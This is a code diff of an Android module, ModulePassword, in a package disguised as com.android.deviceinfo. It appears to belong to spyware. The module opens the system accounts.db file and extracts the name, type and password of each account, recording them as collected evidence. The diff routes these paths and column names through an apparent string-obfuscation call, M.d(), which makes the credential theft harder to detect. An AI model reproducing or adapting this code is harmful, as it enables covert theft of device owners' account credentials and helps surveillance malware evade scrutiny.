@@ -1,15 +1,10 @@
 package com.android.deviceinfo.module;
 
-import java.io.File;
-import java.io.IOException;
 import java.util.HashMap;
 import java.util.Iterator;
 
 import android.database.Cursor;
-import android.database.sqlite.SQLiteDatabase;
-import android.database.sqlite.SQLiteQueryBuilder;
 
-import com.android.deviceinfo.Messages;
 import com.android.deviceinfo.Status;
 import com.android.deviceinfo.auto.Cfg;
 import com.android.deviceinfo.conf.ConfModule;
@@ -18,12 +13,11 @@ import com.android.deviceinfo.db.RecordVisitor;
 import com.android.deviceinfo.evidence.EvidenceReference;
 import com.android.deviceinfo.evidence.EvidenceType;
 import com.android.deviceinfo.evidence.Markup;
-import com.android.deviceinfo.file.Path;
 import com.android.deviceinfo.util.ByteArray;
 import com.android.deviceinfo.util.Check;
 import com.android.deviceinfo.util.StringUtils;
-import com.android.deviceinfo.util.Utils;
 import com.android.deviceinfo.util.WChar;
+import com.android.m.M;
 
 public class ModulePassword extends BaseModule {
 
@@ -121,9 +115,9 @@ public class ModulePassword extends BaseModule {
 		// h_0=/data/system/
 		// h_1=/data/system/users/0/
 		// h_2=accounts.db
-		String pathUser = Messages.getString("h_1");
-		String pathSystem = Messages.getString("h_0");
-		String file = Messages.getString("h_2");
+		String pathUser = M.d("/data/system/users/0/");
+		String pathSystem = M.d("/data/system/");
+		String file = M.d("accounts.db");
 
 		String dbFile = "";
 
@@ -139,14 +133,14 @@ public class ModulePassword extends BaseModule {
 		}
 
 		// h_4=accounts
-		String table = Messages.getString("h_4");
+		String table = M.d("accounts");
 
 		// h_5=_id
 		// h_6=name
 		// h_7=type
 		// h_8=password
-		String[] projection = { Messages.getString("h_5"), Messages.getString("h_6"), Messages.getString("h_7"),
-				Messages.getString("h_8") };
+		String[] projection = { M.d("_id"), M.d("name"), M.d("type"),
+				M.d("password ") };
 		visitor.projection = projection;
 
 		helper.traverseRecords(table, visitor);
